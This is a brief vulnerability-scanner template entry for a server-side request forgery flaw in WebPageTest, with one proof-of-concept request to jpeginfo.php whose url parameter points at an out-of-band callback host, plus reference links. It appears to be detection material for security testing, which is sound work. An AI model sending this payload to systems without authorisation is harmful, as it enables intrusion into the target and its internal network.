# Nuclei Template: Web Page Test - Server Side Request Forgery (SSRF)
**Template ID:** webpagetest-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`webpagetest-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Web Page Test is vulnerable to SSRF.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/jpeginfo/jpeginfo.php?url={{interactsh-url}}
```

## References
- https://thinkloveshare.com/hacking/preauth_remote_code_execution_web_page_test/
- https://github.com/WPO-Foundation/webpagetest
